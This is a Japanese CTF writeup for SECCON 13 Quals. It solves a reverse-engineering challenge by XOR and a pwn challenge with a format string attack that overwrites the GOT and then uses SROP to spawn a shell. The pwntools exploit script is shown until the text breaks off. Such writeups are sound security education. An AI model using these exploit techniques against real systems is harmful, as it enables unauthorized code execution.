<!doctype html><html lang=ja><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=author content="caphosra"><meta name=description content="SECCON 13 Qualsに参加した時に解いた問題の解答を公開します."><meta name=keywords content="ctf,seccon,seccon quals,writeup,pwn"><meta name=twitter:card content="summary"><meta name=twitter:image content="https://caphosra.net/images/icon.webp"><meta name=twitter:title content="[CTF] SECCON 13 Quals writeup"><meta name=twitter:description content="SECCON 13 Qualsに参加した時に解いた問題の解答を公開します."><meta property="og:url" content="https://caphosra.net/posts/2024-11-25-seccon-13-q/"><meta property="og:site_name" content="caphosra note"><meta property="og:title" content="[CTF] SECCON 13 Quals writeup"><meta property="og:description" content="SECCON 13 Qualsに参加した時に解いた問題の解答を公開します."><meta property="og:locale" content="ja"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-11-25T22:33:41+09:00"><meta property="article:modified_time" content="2024-11-25T23:59:53+09:00"><meta property="article:tag" content="CTF"><base href=https://caphosra.net/posts/2024-11-25-seccon-13-q/><title>[CTF] SECCON 13 Quals writeup · caphosra note
</title><link rel=canonical href=https://caphosra.net/posts/2024-11-25-seccon-13-q/><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css integrity="sha256-l85OmPOjvil/SOvVt3HnSSjzF1TUMyT9eV0c2BzEGzU=" crossorigin=anonymous><style defer>@import 'https://fonts.googleapis.com/css2?family=Noto+Sans+JP:wght@300;400;700&display=swap'</style><link rel=stylesheet href=https://caphosra.net/css/coder.min.70f3e69b472ec0878dad3a4928700ac7d4dc99e9a09a656210c5862dcf0acfe7.css integrity="sha256-cPPmm0cuwIeNrTpJKHAKx9TcmemgmmViEMWGLc8Kz+c=" crossorigin=anonymous media=screen><script src=https://cdn.jsdelivr.net/npm/gist-embed@1.0.3/dist/gist-embed.min.js defer></script><link rel=icon type=image/png href=https://caphosra.net/images/logo/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=https://caphosra.net/images/logo/favicon-16x16.png sizes=16x16><meta name=generator content="Hugo 0.139.3"><style type=text/css>.icon{font-size:2.5em}</style></head><body class=colorscheme-light><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=https://caphosra.net/>caphosra note
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=https://caphosra.net/>About</a></li><li class=navigation-item><a class=navigation-link href=https://caphosra.net/posts/>Blog</a></li><li class=navigation-item><a class=navigation-link href=https://caphosra.net/tags/>Tags</a></li><li class=navigation-item><a class=navigation-link href=https://caphosra.net/archives/>Archives</a></li><li class=navigation-item><a class=navigation-link href=https://github.com/caphosra>GitHub</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=https://caphosra.net/en/>English</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://caphosra.net/posts/2024-11-25-seccon-13-q/>[CTF] SECCON 13 Quals writeup</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-11-25T22:33:41+09:00>11月 25, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
4分で読めます</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=https://caphosra.net/tags/ctf/>CTF</a></span></div></div></header><div class=post-content><p>caphosraです. SECCON 13 QualsにTSGで参加しました. 結果は国内7位ということで決勝には進めそうです. 本当にチームメンバーが凄すぎる.</p><p>自分はpwnのParagraphとrevのpackedを解きました. 記録上はrevのJumpも解いたことになっていますが, 雑にフラグをguessしただけなので"解けた"ことにしていいものか&mldr;? どうguessしたかは書きます.</p><h2 id=rev-packed-93pt-119teams>rev: packed (93pt, 119teams)
<a class=heading-link href=#rev-packed-93pt-119teams><i class="fa-solid fa-link" aria-hidden=true title=見出しへのリンク></i>
<span class=sr-only>見出しへのリンク</span></a></h2><p>gdbをアタッチして手動で前から実行していくと, 入力文字列をある2つのバイト列とxorして0になるかどうかを判定していることがわかる. xorの性質から<code>(a xor b) xor c == 0</code>は<code>a == b xor c</code>なので, この2つのバイト列のxorをとってあげれば良い.</p><div class=highlight><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#aa89ea>a</span> <span style=color:#54b1c7>=</span> <span style=color:#abb2bf>[</span><span style=color:#d19a66>0xe8</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x4a</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x0</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x0</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x0</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x83</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0xf9</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x49</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x75</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x44</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x53</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x57</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x48</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x8d</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x4c</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x37</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0xfd</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x5e</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x56</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x5b</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0xeb</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x2f</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x48</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x39</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0xce</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x73</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x32</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x56</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x5e</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0xac</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x3c</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x80</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x72</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0xa</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x3c</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x8f</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x77</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x6</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x80</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x7e</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0xfe</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0xf</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x74</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x6</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x2c</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0xe8</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x3c</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x1</span><span style=color:#abb2bf>]</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>b</span> <span style=color:#54b1c7>=</span> <span style=color:#abb2bf>[</span><span style=color:#d19a66>0xbb</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0xf</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x43</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x43</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x4f</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0xcd</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x82</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x1c</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x25</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x1c</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0xc</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x24</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x7f</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0xf8</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x2e</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x68</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0xcc</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x2d</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x9</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x3a</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0xb4</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x48</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x78</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x56</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0xaa</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x2c</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x42</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x3a</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x6a</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0xcf</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0xf</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0xdf</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x14</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x3a</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x4e</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0xd0</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x1f</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x37</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0xe4</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x17</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x90</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x39</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x2b</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x65</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x1c</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x8c</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0xf</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x7c</span><span style=color:#abb2bf>]</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>text</span> <span style=color:#54b1c7>=</span> <span style=color:#63c381>&#34;&#34;</span>
</span></span><span style=display:flex><span><span style=color:#76a9f9>for</span> <span style=color:#aa89ea>i</span> <span style=color:#b756ff;font-weight:700>in</span> <span style=color:#e5c07b>range</span><span style=color:#abb2bf>(</span><span style=color:#e5c07b>len</span><span style=color:#abb2bf>(</span><span style=color:#aa89ea>a</span><span style=color:#abb2bf>)):</span>
</span></span><span style=display:flex><span>    <span style=color:#aa89ea>text</span> <span style=color:#54b1c7>+=</span> <span style=color:#e5c07b>chr</span><span style=color:#abb2bf>(</span><span style=color:#aa89ea>a</span><span style=color:#abb2bf>[</span><span style=color:#aa89ea>i</span><span style=color:#abb2bf>]</span> <span style=color:#54b1c7>^</span> <span style=color:#aa89ea>b</span><span style=color:#abb2bf>[</span><span style=color:#aa89ea>i</span><span style=color:#abb2bf>])</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span><span style=color:#abb2bf>(</span><span style=color:#aa89ea>text</span><span style=color:#abb2bf>)</span>
</span></span></code></pre></div><p>FLAG: <code>SECCON{UPX_s7ub_1s_a_g0od_pl4c3_f0r_h1din6_c0d3}</code></p><p>Flagを見て初めてUPXに思いを馳せることが想定されているのか, と思った. 時代はやっぱり人の手でやるまごころデバッグですよ.</p><h2 id=pwn-paragraph-125pt-65teams>pwn: Paragraph (125pt, 65teams)
<a class=heading-link href=#pwn-paragraph-125pt-65teams><i class="fa-solid fa-link" aria-hidden=true title=見出しへのリンク></i>
<span class=sr-only>見出しへのリンク</span></a></h2><p>ソースコードを見ると露骨にFormat String Attackしてね〜という顔をした<code>printf</code>がいる.</p><div class=highlight><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#8a93a5;font-style:italic>// char name[24];
</span></span></span><span style=display:flex><span><span style=color:#8a93a5;font-style:italic></span><span style=color:#00b1f7>scanf</span><span style=color:#abb2bf>(</span><span style=color:#98c379>&#34;%23s&#34;</span><span style=color:#abb2bf>,</span> <span style=color:#aa89ea>name</span><span style=color:#abb2bf>);</span>
</span></span><span style=display:flex><span><span style=color:#00b1f7>printf</span><span style=color:#abb2bf>(</span><span style=color:#aa89ea>name</span><span style=color:#abb2bf>);</span>
</span></span><span style=display:flex><span><span style=color:#00b1f7>printf</span><span style=color:#abb2bf>(</span><span style=color:#98c379>&#34; answered, a bit confused.</span><span style=color:#d26464;font-weight:700>\n\&#34;</span><span style=color:#98c379>Welcome to SECCON,</span><span style=color:#d26464;font-weight:700>\&#34;</span><span style=color:#98c379> the cat greeted %s warmly.</span><span style=color:#d26464;font-weight:700>\n</span><span style=color:#98c379>&#34;</span><span style=color:#abb2bf>,</span> <span style=color:#aa89ea>name</span><span style=color:#abb2bf>);</span>
</span></span></code></pre></div><p>ここで問題となるのはFormat String Attackでどこを書き換えてあげれば良いかである. このscanfでpayloadを送るタイミングではglibcのアドレスもわからないのでリターンアドレスを書き換えてROPするのは辛そうなので, GOTを書き換えてその下の<code>printf</code>を<code>scanf</code>に挿げ替えることを考えた. こうするとちょうど下の行が,</p><div class=highlight><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#00b1f7>scanf</span><span style=color:#abb2bf>(</span><span style=color:#98c379>&#34; answered, a bit confused.</span><span style=color:#d26464;font-weight:700>\n\&#34;</span><span style=color:#98c379>Welcome to SECCON,</span><span style=color:#d26464;font-weight:700>\&#34;</span><span style=color:#98c379> the cat greeted %s warmly.</span><span style=color:#d26464;font-weight:700>\n</span><span style=color:#98c379>&#34;</span><span style=color:#abb2bf>,</span> <span style=color:#aa89ea>name</span><span style=color:#abb2bf>);</span>
</span></span></code></pre></div><p>と同等になるので, スタック上の変数<code>name</code>に好きな長さの文字列を送り込める. <code>scanf</code>は<code>printf</code>とかなり近いアドレスにあるので, アドレスを下位4bits書き換えるだけで良い. ただ, 固定の下位3bitsはいいとして, 残りの1bitはランダムなので1/16の確率でしか通らない. 100%解法が存在するのかかなり気になっている.</p><p>さて, あとはスタックに適当なpayloadを流せば良い. 今回は折角なのでSROPした.</p><div class=highlight><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#8a93a5;font-weight:700;font-style:italic>#!/usr/bin/env python3</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#76a9f9>import</span> <span style=color:#ca72ff>sys</span>
</span></span><span style=display:flex><span><span style=color:#76a9f9>from</span> <span style=color:#ca72ff>pwn</span> <span style=color:#76a9f9>import</span> <span style=color:#54b1c7>*</span>
</span></span><span style=display:flex><span><span style=color:#76a9f9>import</span> <span style=color:#ca72ff>time</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8a93a5;font-style:italic># REMOTE = (&#34;&#34;, 5000)</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>EXEC</span> <span style=color:#54b1c7>=</span> <span style=color:#63c381>&#34;./chall&#34;</span>
</span></span><span style=display:flex><span><span style=color:#76a9f9>if</span> <span style=color:#e5c07b>len</span><span style=color:#abb2bf>(</span><span style=color:#aa89ea>sys</span><span style=color:#54b1c7>.</span><span style=color:#aa89ea>argv</span><span style=color:#abb2bf>)</span> <span style=color:#54b1c7>==</span> <span style=color:#d19a66>1</span><span style=color:#abb2bf>:</span>
</span></span><span style=display:flex><span>    <span style=color:#aa89ea>sock</span> <span style=color:#54b1c7>=</span> <span style=color:#aa89ea>process</span><span style=color:#abb2bf>(</span><span style=color:#aa89ea>EXEC</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span>    <span style=color:#aa89ea>IS_REMOTE</span> <span style=color:#54b1c7>=</span> <span style=color:#e5c07b>False</span>
</span></span><span style=display:flex><span>    <span style=color:#aa89ea>glibc</span> <span style=color:#54b1c7>=</span> <span style=color:#aa89ea>ELF</span><span style=color:#abb2bf>(</span><span style=color:#63c381>&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span>    <span style=color:#aa89ea>ret</span> <span style=color:#54b1c7>=</span> <span style=color:#d19a66>171368</span>
</span></span><span style=display:flex><span>    <span style=color:#aa89ea>mod_rax</span> <span style=color:#54b1c7>=</span> <span style=color:#d19a66>0x0003fd21</span>
</span></span><span style=display:flex><span><span style=color:#76a9f9>else</span><span style=color:#abb2bf>:</span>
</span></span><span style=display:flex><span>    <span style=color:#76a9f9>assert</span> <span style=color:#aa89ea>sys</span><span style=color:#54b1c7>.</span><span style=color:#aa89ea>argv</span><span style=color:#abb2bf>[</span><span style=color:#d19a66>1</span><span style=color:#abb2bf>]</span> <span style=color:#54b1c7>==</span> <span style=color:#63c381>&#34;remote&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#aa89ea>sock</span> <span style=color:#54b1c7>=</span> <span style=color:#aa89ea>remote</span><span style=color:#abb2bf>(</span><span style=color:#63c381>&#34;paragraph.seccon.games&#34;</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>5000</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span>    <span style=color:#aa89ea>IS_REMOTE</span> <span style=color:#54b1c7>=</span> <span style=color:#e5c07b>True</span>
</span></span><span style=display:flex><span>    <span style=color:#aa89ea>glibc</span> <span style=color:#54b1c7>=</span> <span style=color:#aa89ea>ELF</span><span style=color:#abb2bf>(</span><span style=color:#63c381>&#34;./libc.so.6&#34;</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span>    <span style=color:#aa89ea>ret</span> <span style=color:#54b1c7>=</span> <span style=color:#d19a66>172490</span>
</span></span><span style=display:flex><span>    <span style=color:#aa89ea>mod_rax</span> <span style=color:#54b1c7>=</span> <span style=color:#d19a66>0x00045321</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>context</span><span style=color:#54b1c7>.</span><span style=color:#aa89ea>arch</span> <span style=color:#54b1c7>=</span> <span style=color:#63c381>&#34;x86_64&#34;</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>sock</span><span style=color:#54b1c7>.</span><span style=color:#aa89ea>debug</span> <span style=color:#54b1c7>=</span> <span style=color:#e5c07b>True</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>elf</span> <span style=color:#54b1c7>=</span> <span style=color:#aa89ea>ELF</span><span style=color:#abb2bf>(</span><span style=color:#63c381>&#34;./chall&#34;</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>rop</span> <span style=color:#54b1c7>=</span> <span style=color:#aa89ea>ROP</span><span style=color:#abb2bf>([</span><span style=color:#aa89ea>glibc</span><span style=color:#abb2bf>])</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>input</span><span style=color:#abb2bf>(</span><span style=color:#63c381>&#34;[;] Waiting...&#34;</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>printf_addr</span> <span style=color:#54b1c7>=</span> <span style=color:#aa89ea>glibc</span><span style=color:#54b1c7>.</span><span style=color:#aa89ea>symbols</span><span style=color:#abb2bf>[</span><span style=color:#63c381>&#34;printf&#34;</span><span style=color:#abb2bf>]</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>scanf_addr</span> <span style=color:#54b1c7>=</span> <span style=color:#aa89ea>glibc</span><span style=color:#54b1c7>.</span><span style=color:#aa89ea>symbols</span><span style=color:#abb2bf>[</span><span style=color:#63c381>&#34;__isoc99_scanf&#34;</span><span style=color:#abb2bf>]</span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span><span style=color:#abb2bf>(</span><span style=color:#98c379>f</span><span style=color:#63c381>&#34;[!] printf: </span><span style=color:#98c379>{</span><span style=color:#e5c07b>hex</span><span style=color:#abb2bf>(</span><span style=color:#aa89ea>printf_addr</span><span style=color:#abb2bf>)</span><span style=color:#98c379>}</span><span style=color:#63c381>&#34;</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span><span style=color:#abb2bf>(</span><span style=color:#98c379>f</span><span style=color:#63c381>&#34;[!] scanf: </span><span style=color:#98c379>{</span><span style=color:#e5c07b>hex</span><span style=color:#abb2bf>(</span><span style=color:#aa89ea>scanf_addr</span><span style=color:#abb2bf>)</span><span style=color:#98c379>}</span><span style=color:#63c381>&#34;</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span><span style=color:#abb2bf>(</span><span style=color:#98c379>f</span><span style=color:#63c381>&#34;[!] ret: </span><span style=color:#98c379>{</span><span style=color:#e5c07b>hex</span><span style=color:#abb2bf>(</span><span style=color:#aa89ea>ret</span><span style=color:#abb2bf>)</span><span style=color:#98c379>}</span><span style=color:#63c381>&#34;</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>printf_got</span> <span style=color:#54b1c7>=</span> <span style=color:#aa89ea>elf</span><span style=color:#54b1c7>.</span><span style=color:#aa89ea>got</span><span style=color:#abb2bf>[</span><span style=color:#63c381>&#34;printf&#34;</span><span style=color:#abb2bf>]</span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span><span style=color:#abb2bf>(</span><span style=color:#98c379>f</span><span style=color:#63c381>&#34;[!] printf got: </span><span style=color:#98c379>{</span><span style=color:#e5c07b>hex</span><span style=color:#abb2bf>(</span><span style=color:#aa89ea>printf_got</span><span style=color:#abb2bf>)</span><span style=color:#98c379>}</span><span style=color:#63c381>&#34;</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>lower</span> <span style=color:#54b1c7>=</span> <span style=color:#aa89ea>scanf_addr</span> <span style=color:#54b1c7>%</span> <span style=color:#d19a66>0x1000</span> <span style=color:#54b1c7>+</span> <span style=color:#d19a66>0x1000</span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span><span style=color:#abb2bf>(</span><span style=color:#98c379>f</span><span style=color:#63c381>&#34;[!] lower: </span><span style=color:#98c379>{</span><span style=color:#e5c07b>hex</span><span style=color:#abb2bf>(</span><span style=color:#aa89ea>lower</span><span style=color:#abb2bf>)</span><span style=color:#98c379>}</span><span style=color:#63c381>&#34;</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>payload</span> <span style=color:#54b1c7>=</span> \
</span></span><span style=display:flex><span>    <span style=color:#98c379>f</span><span style=color:#63c381>&#34;%</span><span style=color:#98c379>{</span><span style=color:#aa89ea>lower</span><span style=color:#98c379>}</span><span style=color:#63c381>c&#34;</span><span style=color:#54b1c7>.</span><span style=color:#aa89ea>encode</span><span style=color:#abb2bf>()</span> \
</span></span><span style=display:flex><span>    <span style=color:#54b1c7>+</span> <span style=color:#98c379>b</span><span style=color:#63c381>&#34;%8$hn&#34;</span> \
</span></span><span style=display:flex><span>    <span style=color:#54b1c7>+</span> <span style=color:#98c379>b</span><span style=color:#63c381>&#34;%11$p&#34;</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>payload</span> <span style=color:#54b1c7>+=</span> \
</span></span><span style=display:flex><span>    <span style=color:#98c379>b</span><span style=color:#63c381>&#34;A&#34;</span> <span style=color:#54b1c7>*</span> <span style=color:#abb2bf>(</span><span style=color:#d19a66>0x10</span> <span style=color:#54b1c7>-</span> <span style=color:#e5c07b>len</span><span style=color:#abb2bf>(</span><span style=color:#aa89ea>payload</span><span style=color:#abb2bf>))</span> \
</span></span><span style=display:flex><span>    <span style=color:#54b1c7>+</span> <span style=color:#aa89ea>p64</span><span style=color:#abb2bf>(</span><span style=color:#aa89ea>printf_got</span><span style=color:#abb2bf>)[</span><span style=color:#d19a66>0</span><span style=color:#abb2bf>:</span><span style=color:#d19a66>6</span><span style=color:#abb2bf>]</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>sock</span><span style=color:#54b1c7>.</span><span style=color:#aa89ea>sendlineafter</span><span style=color:#abb2bf>(</span><span style=color:#98c379>b</span><span style=color:#63c381>&#34;.</span><span style=color:#d26464;font-weight:700>\n</span><span style=color:#63c381>&#34;</span><span style=color:#abb2bf>,</span> <span style=color:#aa89ea>payload</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>sock</span><span style=color:#54b1c7>.</span><span style=color:#aa89ea>recvuntil</span><span style=color:#abb2bf>(</span><span style=color:#98c379>b</span><span style=color:#63c381>&#34;0x&#34;</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>glibc</span><span style=color:#54b1c7>.</span><span style=color:#aa89ea>address</span> <span style=color:#54b1c7>=</span> <span style=color:#e5c07b>int</span><span style=color:#abb2bf>(</span><span style=color:#aa89ea>sock</span><span style=color:#54b1c7>.</span><span style=color:#aa89ea>recv</span><span style=color:#abb2bf>(</span><span style=color:#d19a66>12</span><span style=color:#abb2bf>),</span> <span style=color:#d19a66>16</span><span style=color:#abb2bf>)</span> <span style=color:#54b1c7>-</span> <span style=color:#aa89ea>ret</span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span><span style=color:#abb2bf>(</span><span style=color:#98c379>f</span><span style=color:#63c381>&#34;[!] glibc base: </span><span style=color:#98c379>{</span><span style=color:#e5c07b>hex</span><span style=color:#abb2bf>(</span><span style=color:#aa89ea>glibc</span><span style=color:#54b1c7>.</span><span style=color:#aa89ea>address</span><span style=color:#abb2bf>)</span><span style=color:#98c379>}</span><span style=color:#63c381>&#34;</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>mod_rax</span> <span style=color:#54b1c7>=</span> <span style=color:#aa89ea>glibc</span><span style=color:#54b1c7>.</span><span style=color:#aa89ea>address</span> <span style=color:#54b1c7>+</span> <span style=color:#aa89ea>mod_rax</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>binsh</span> <span style=color:#54b1c7>=</span> <span style=color:#e5c07b>next</span><span style=color:#abb2bf>(</span><span style=color:#aa89ea>glibc</span><span style=color:#54b1c7>.</span><span style=color:#aa89ea>search</span><span style=color:#abb2bf>(</span><span style=color:#98c379>b</span><span style=color:#63c381>&#34;/bin/sh</span><span style=color:#d26464;font-weight:700>\x00</span><span style=color:#63c381>&#34;</span><span style=color:#abb2bf>))</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>sigret_frame</span> <span style=color:#54b1c7>=</span> <span style=color:#aa89ea>SigreturnFrame</span><span style=color:#abb2bf>()</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>sigret_frame</span><span style=color:#54b1c7>.</span><span style=color:#aa89ea>rax</span> <span style=color:#54b1c7>=</span> <span style=color:#aa89ea>constants</span><span style=color:#54b1c7>.</span><span style=color:#aa89ea>SYS_execve</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>sigret_frame</span><span style=color:#54b1c7>.</span><span style=color:#aa89ea>rdi</span> <span style=color:#54b1c7>=</span> <span style=color:#aa89ea>binsh</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>sigret_frame</span><span style=color:#54b1c7>.</span><span style=color:#aa89ea>rsi</span> <span style=color:#54b1c7>=</span> <span style=color:#d19a66>0</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>sigret_frame</span><span style=color:#54b1c7>.</span><span style=color:#aa89ea>rdx</span> <span style=color:#54b1c7>=</span> <span style=color:#d19a66>0</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>sigret_frame</span><span style=color:#54b1c7>.</span><span style=color:#aa89ea>rip</span> <span style=color:#54b1c7>=</span> <span style=color:#aa89ea>mod_rax</span> <span style=color:#54b1c7>+</span> <span style=color:#d19a66>6</span>
</span></span><span style=display:flex><span>
